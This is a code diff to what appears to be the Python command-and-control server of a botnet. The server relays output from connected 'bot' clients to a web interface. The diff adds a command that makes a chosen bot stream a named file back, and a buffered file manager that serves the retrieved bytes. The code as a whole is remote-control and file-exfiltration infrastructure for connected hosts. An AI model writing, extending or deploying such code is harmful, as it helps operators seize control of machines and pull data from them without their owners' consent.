@@ -16,6 +16,10 @@ MIN_CLIENT_VERSION = "0.2"
 
 class BotNet(Thread):
     INPUT_TIMEOUT = 1
+    STDOUT_JSON = 'stdout'
+    STDERR_JSON = 'stderr'
+    FILESTREAM_JSON = 'filestreams'
+    FILECLOSE_JSON = 'fileclose'
 
     def __init__(self, socketio):
         super().__init__()
@@ -23,6 +27,7 @@ class BotNet(Thread):
         self.conncon = Condition(self.connlock)
         self.allConnections = {}
         self.socketio = socketio
+        self.filemanager = BotNetFileManager()
 
     def addConnection(self, user, conn):
         with self.connlock:
@@ -67,9 +72,31 @@ class BotNet(Thread):
                 try:
                     msg = bot.recv()
                     jsonobj = json.loads(msg.decode('UTF-8'))
-                    jsonobj['user'] = user
-                    jsonobj['stdout'] = jsonobj['stdout'].rstrip()
-                    self.socketio.emit('response', jsonobj, namespace="/bot")
+                    out = ""
+                    err = ""
+                    filestream = {}
+                    fileclose = []
+
+                    if BotNet.STDOUT_JSON in jsonobj:
+                        out = jsonobj[BotNet.STDOUT_JSON].rstrip()
+                    if BotNet.STDERR_JSON in jsonobj:
+                        err = jsonobj[BotNet.STDERR_JSON].rstrip()
+                    if BotNet.FILESTREAM_JSON in jsonobj:
+                        filestream = jsonobj[BotNet.FILESTREAM_JSON]
+                    if BotNet.FILECLOSE_JSON in jsonobj:
+                        fileclose = jsonobj[BotNet.FILECLOSE_JSON]
+
+                    # Forward stdout/stderr as needed
+                    self.socketio.emit('response', {'user':user,'stdout':out,'stderr':err}, namespace="/bot")
+
+                    # Forward file bytes as needed
+                    for filename in filestream.keys():
+                        filebytes = filestream[filename].encode('UTF-8')
+                        self.filemanager.appendBytesToFile(user,filename,filebytes)
+
+                    for filename in fileclose:
+                        self.filemanager.closeFile(user,filename)
+
                 except IOError:
                     # Connection was interrupted
                     self.removeConnection(user)
@@ -110,6 +137,17 @@ class BotNet(Thread):
                                {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
             return False
 
+    def startFileDownload(self, user, filename):
+        with self.connlock:
+            if user in self.allConnections:
+                self.filemanager.clearFile(user,filename)
+                self.allConnections[user].startFileDownload(filename)
+                return self.filemanager.getFileGenerator(user,filename)
+            return None
+
+    def getFileManager(self):
+        return self.filemanager
+
 
 class BotServer(Thread):
     def __init__(self, tcpsock, botnet, socketio, clientfile):
@@ -147,6 +185,7 @@ class Bot:
     FILE_FILENAME = 'fname'
     CLIENT_STREAM = 'cstream'
     CLIENT_CLOSE = 'cclose'
+    FILE_DOWNLOAD = 'down'
 
     def __init__(self, sock, host_info, socketio):
         self.sock = formatsock.FormatSocket(sock)
@@ -204,3 +243,60 @@ class Bot:
                 self.sock.send(json_str)
                 fileobj.close()
                 # TODO emit file upload success
+
+    def startFileDownload(self, filename):
+        with self.botlock:
+            json_str = json.dumps({Bot.FILE_DOWNLOAD:filename})
+            self.sock.send(json_str)
+
+class BotNetFileManager:
+    # TODO: change to separate locks for each file
+    def __init__(self):
+        self.files = {}
+        self.closed = set()
+        self.lock = Lock()
+        self.cond = Condition(self.lock)
+
+    def getFileGenerator(self, user, filename):
+        uf = (user,filename)
+        def filegen():
+            with self.lock:
+                # While there's something left and it's not closed
+                # Therefore: exits loop if closed and empty buffer
+                while uf not in self.closed or len(self.files[uf]) > 0:
+                    # Wait until closed or something to write
+                    # Therefore: exits wait if closed or nonempty buffer
+                    while (uf not in self.files or len(self.files[uf])==0) and uf not in self.closed:
+                        self.cond.wait()
+                    if len(self.files[uf]) > 0:
+                        temp = self.files[uf]
+                        self.files[uf] = b''
+                        print("Yielding ",temp)
+                        yield temp
+                print("Done yielding")
+                self.closed.remove(uf)
+        return filegen()
+
+    def appendBytesToFile(self, user, filename, wbytes):
+        uf = (user, filename)
+        with self.lock:
+            if uf not in self.files:
+                self.files[uf] = b''
+            print("Appending ",wbytes)
+            self.files[uf] += wbytes
+            self.cond.notify()
+
+    def clearFile(self, user, filename):
+        uf = (user, filename)
+        with self.lock:
+            if uf in self.files:
+                self.files[uf] = b''
+            if uf in self.closed:
+                self.closed.remove(uf)
+
+    def closeFile(self, user, filename):
+        uf = (user, filename)
+        with self.lock:
+            if uf not in self.closed:
+                self.closed.add(uf)
+                self.cond.notify()
